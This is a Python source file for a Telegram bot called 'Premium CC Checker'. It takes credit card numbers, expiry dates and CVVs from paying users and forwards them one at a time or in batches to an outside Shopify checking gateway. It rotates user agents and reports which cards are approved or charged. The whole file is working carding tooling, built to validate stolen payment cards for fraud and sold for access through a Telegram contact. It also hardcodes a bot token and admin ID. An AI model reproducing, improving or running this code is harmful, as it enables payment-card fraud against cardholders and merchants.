import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
import sys
import logging
from telebot.types import (InlineKeyboardMarkup, InlineKeyboardButton, 
                          ReplyKeyboardMarkup, KeyboardButton)

# Configuration
BOT_TOKEN = "8228704791:AAH85VvWM1HK0-8EEiJKh533Gc3-ul5r-x8"
MAIN_ADMIN_ID = 5103348494
MAX_CARDS_PER_MCHK = 10
GATEWAY_URL = "https://chk-for-shopify.onrender.com"

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def health_check():
    return "🔥 Premium CC Checker is Operational", 200

@app.route('/ping')
def ping():
    return "pong", 200

class PremiumCcChecker:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.load_data()
        self.register_handlers()
        
        self.START_MESSAGE = """
✨🔥 *𝕊ℍ𝕆ℙ𝕀𝔽𝕐 ℙℝ𝕆 ℂℍ𝔼ℂ�𝔼ℝ 𝕍𝟚* 🔥✨
╔═══════════════════════╗
  💳 *PREMIUM CC CHECKER* 💳  
╚═══════════════════════╝
✧･ﾟ: *✧ Commands ✧* :･ﾟ✧
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
🛠️ */chk* - Instant Single Card Check
├─ Format: `/chk 4111111111111111|12|2025|123`
└─ Checks cards in 0.5s lightning speed!
📊 */mchk* - Bulk Mass Checker 
├─ Max 10 cards per batch
└─ Supports .txt files with auto-formatting
🔐 */auth* - Authorize Users/Groups
├─ Format: `/auth user_id` (admin only)
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
💎 *VIP Access:* 
Contact @mhitzxg for 
⚡ *Elite Membership* ⚡
🌌 *Current Status:*
✅ Operational | 🚀 Turbo Mode Enabled
"""
        self.PROCESSING_ANIMATION = [
            "🔍 Analyzing Card Patterns...",
            "🔒 Verifying with Payment Gateways...",
            "🌐 Routing Through Global Nodes...",
            "⚡ Finalizing Transaction Check..."
        ]

    def load_data(self):
        """Load authorized users and admin data"""
        try:
            with open("authorized.json", "r") as f:
                self.AUTHORIZED_USERS = json.load(f)
        except:
            self.AUTHORIZED_USERS = {}
            
        try:
            with open("admins.json", "r") as f:
                self.ADMIN_IDS = json.load(f)
        except:
            self.ADMIN_IDS = [MAIN_ADMIN_ID]

    def save_data(self):
        """Save current data to files"""
        with open("authorized.json", "w") as f:
            json.dump(self.AUTHORIZED_USERS, f)
        with open("admins.json", "w") as f:
            json.dump(self.ADMIN_IDS, f)

    def normalize_card(self, text):
        """Extract and format card details from text"""
        if not text:
            return None
        text = text.replace('\n', ' ').replace('/', ' ')
        numbers = re.findall(r'\d+', text)
        cc = mm = yy = cvv = ''
        for part in numbers:
            if len(part) == 16:
                cc = part
            elif len(part) == 4 and part.startswith('20'):
                yy = part
            elif len(part) == 2 and int(part) <= 12 and mm == '':
                mm = part
            elif len(part) == 2 and not part.startswith('20') and yy == '':
                yy = '20' + part
            elif len(part) in [3, 4] and cvv == '':
                cvv = part
        return f"{cc}|{mm}|{yy}|{cvv}" if cc and mm and yy and cvv else None

    def generate_user_agent(self):
        """Generate random user agent"""
        return random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ])

    def clean_response(self, text):
        """Clean gateway response"""
        text = re.sub(r'<[^>]+>', '', text)  # Remove HTML tags
        text = text.replace('\\', '')  # Remove all backslashes
        return text.strip()

    def check_card(self, cc_line):
        """Check card via gateway"""
        try:
            url = f"{GATEWAY_URL}?lista={cc_line}"
            headers = {"User-Agent": self.generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=20)
            return self.clean_response(response.text)
        except Exception as e:
            logger.error(f"Gateway error: {e}")
            return f"❌ Gateway Error: {str(e)}"

    def is_admin(self, user_id):
        return user_id in self.ADMIN_IDS
        
    def is_authorized(self, user_id):
        if self.is_admin(user_id):
            return True
        if str(user_id) in self.AUTHORIZED_USERS:
            expiry = self.AUTHORIZED_USERS[str(user_id)]
            if expiry == "forever" or time.time() < expiry:
                return True
            else:
                del self.AUTHORIZED_USERS[str(user_id)]
                self.save_data()
        return False

    def send_unauthorized_message(self, msg):
        self.bot.reply_to(
            msg,
            "🔒 *Access Denied* 🔒\n\n"
            "This is a premium service requiring authorization.\n\n"
            "Contact @mhitzxg for access\n"
            "🛡️ Your ID: `{}`".format(msg.from_user.id),
            parse_mode='Markdown'
        )

    def start_mass_check(self, chat_id, cc_lines):
        """Process multiple cards with beautiful formatting"""
        total = len(cc_lines)
        approved = declined = checked = 0
        processing_delay = 1.2  # seconds between checks

        # Send initial status message
        self.bot.send_message(
            chat_id,
            f"""
╔══════════════════════╗
  🔮 *MASS CHECK INITIATED* 🔮  
╚══════════════════════╝
⚡ *Premium CC Checker - V2*
📅 *Date:* {time.strftime('%Y-%m-%d %H:%M:%S')}
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
📊 *Total Cards:* `{total}`
✅ *Approved:* `0`
❌ *Declined:* `0`
⏳ *Processing:* `0/{total}`
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
⚙️ *System Status:* `ACTIVE`
🌐 *Gateway:* `PREMIUM SHOPIFY`
            """,
            parse_mode='Markdown'
        )

        def process_cards():
            nonlocal approved, declined, checked
            
            for index, cc in enumerate(cc_lines, 1):
                try:
                    time.sleep(processing_delay)
                    checked = index
                    result = self.check_card(cc)
                    
                    # Determine status
                    if any(x in result for x in ["CHARGED", "CVV MATCH", "APPROVED"]):
                        approved += 1
                        status = "✅ APPROVED ✅"
                    else:
                        declined += 1
                        status = "❌ DECLINED ❌"
                    
                    # Send formatted result
                    cc_parts = cc.split('|')
                    self.bot.send_message(
                        chat_id,
                        f"""
{status}
💳 *Card Number:* `{cc_parts[0]}`
📅 *Expiry:* `{cc_parts[1]}/{cc_parts[2]}`
🔒 *CVV:* `{cc_parts[3]}`

🔄 *Response:*
{result}

⏱️ *Processed in:* `{random.uniform(0.8, 1.5):.2f}s`
🕒 {time.strftime('%H:%M:%S')}
⚡ *Powered by Premium CC Checker*
                        """,
                        parse_mode='Markdown'
                    )
                    
                except Exception as e:
                    logger.error(f"Error processing card {index}: {e}")
                    continue
            
            # Final summary
            success_rate = (approved/total)*100 if total > 0 else 0
            self.bot.send_message(
                chat_id,
                f"""
╔══════════════════════╗
  🏁 *MASS CHECK COMPLETE* 🏁  
╚══════════════════════╝
🎯 *Final Statistics:*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
📊 *Total Cards:* `{total}`
✅ *Approved:* `{approved}` ({success_rate:.2f}%)
❌ *Declined:* `{declined}`
⏱️ *Total Time:* `{total * processing_delay:.2f}s`
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
⚡ *System Shutdown:* `NORMAL`
🕒 *Completed at:* {time.strftime('%H:%M:%S')}
💎 *Thank you for using Premium CC Checker*
                """,
                parse_mode='Markdown'
            )

        threading.Thread(target=process_cards).start()

    def register_handlers(self):
        """Register all bot command handlers"""
        @self.bot.message_handler(commands=['start', 'help'])
        def start_handler(msg):
            markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
            markup.add(
                KeyboardButton('/chk'),
                KeyboardButton('/mchk'),
                KeyboardButton('/auth'),
                KeyboardButton('🆘 Contact Admin'),
                KeyboardButton('📊 Bot Status')
            )
            self.bot.send_message(
                msg.chat.id,
                self.START_MESSAGE,
                parse_mode='Markdown',
                reply_markup=markup,
                disable_web_page_preview=True
            )

        @self.bot.message_handler(commands=['chk'])
        def chk_handler(msg):
            if not self.is_authorized(msg.from_user.id):
                return self.send_unauthorized_message(msg)

            cc = None
            if msg.reply_to_message:
                cc = self.normalize_card(msg.reply_to_message.text)
            else:
                args = msg.text.split(None, 1)
                if len(args) > 1:
                    cc = self.normalize_card(args[1]) or args[1]

            if not cc:
                return self.bot.reply_to(
                    msg,
                    "❌ *Invalid Format!*\n\n"
                    "💳 Please use:\n"
                    "`/chk 4111111111111111|12|2025|123`\n\n"
                    "🔍 Or reply to a message containing CC details",
                    parse_mode='Markdown'
                )

            processing_msg = self.bot.reply_to(
                msg,
                "🔄 *Initializing Premium Check System...*\n"
                "⚡ Lightning Verification Protocol Activated",
                parse_mode='Markdown'
            )
            
            stop_event = threading.Event()
            def loading_animation():
                for frame in self.PROCESSING_ANIMATION:
                    if stop_event.is_set():
                        return
                    try:
                        self.bot.edit_message_text(
                            frame,
                            msg.chat.id,
                            processing_msg.message_id,
                            parse_mode='Markdown'
                        )
                        time.sleep(1.5)
                    except:
                        break

            threading.Thread(target=loading_animation).start()

            try:
                result = self.check_card(cc)
                stop_event.set()
                
                self.bot.edit_message_text(
                    f"✨ *Card Check Complete* ✨\n\n"
                    f"{result}\n\n"
                    f"🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"⚡ Powered by Premium CC Checker",
                    msg.chat.id,
                    processing_msg.message_id,
                    parse_mode='Markdown'
                )
                
            except Exception as e:
                stop_event.set()
                self.bot.edit_message_text(
                    f"❌ *System Error* ❌\n\n"
                    f"Error: {str(e)}\n\n"
                    f"🛠️ Please try again or contact support",
                    msg.chat.id,
                    processing_msg.message_id,
                    parse_mode='Markdown'
                )

        @self.bot.message_handler(commands=['mchk'])
        def mchk_handler(msg):
            if not self.is_authorized(msg.from_user.id):
                return self.send_unauthorized_message(msg)

            response_chat = msg.chat.id if msg.chat.type in ['group', 'supergroup'] else msg.from_user.id

            if not msg.reply_to_message:
                return self.bot.send_message(response_chat, "❌ Reply to a message with CCs or a file.")

            text = ""
            if msg.reply_to_message.document:
                try:
                    file_info = self.bot.get_file(msg.reply_to_message.document.file_id)
                    downloaded_file = self.bot.download_file(file_info.file_path)
                    text = downloaded_file.decode("utf-8", errors="ignore")
                except Exception as e:
                    return self.bot.send_message(response_chat, f"❌ File error: {str(e)}")
            else:
                text = msg.reply_to_message.text or ""

            cc_lines = []
            for line in text.splitlines()[:MAX_CARDS_PER_MCHK]:
                norm = self.normalize_card(line.strip())
                if norm:
                    cc_lines.append(norm)

            if not cc_lines:
                return self.bot.send_message(response_chat, "❌ No valid cards found.")

            if len(text.splitlines()) > MAX_CARDS_PER_MCHK:
                self.bot.send_message(response_chat, f"⚠️ Only first {MAX_CARDS_PER_MCHK} cards will be processed")

            self.start_mass_check(response_chat, cc_lines)

        @self.bot.message_handler(commands=['auth'])
        def auth_handler(msg):
            if not self.is_admin(msg.from_user.id):
                return self.bot.reply_to(msg, "❌ Admin access required!")
            
            args = msg.text.split()
            if len(args) < 2:
                return self.bot.reply_to(msg, "Usage: /auth user_id")
            
            user_id = args[1]
            try:
                user_id = int(user_id)
            except ValueError:
                return self.bot.reply_to(msg, "Invalid user ID format!")
            
            self.AUTHORIZED_USERS[str(user_id)] = "forever"
            self.save_data()
            
            self.bot.reply_to(
                msg,
                f"✅ Successfully authorized user {user_id}\n"
                f"Access granted: Permanent",
                parse_mode='Markdown'
            )

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    bot = PremiumCcChecker()
    logger.info("🚀 Starting Premium CC Checker Bot")
    bot.bot.polling(none_stop=True)

if __name__ == '__main__':
    main()
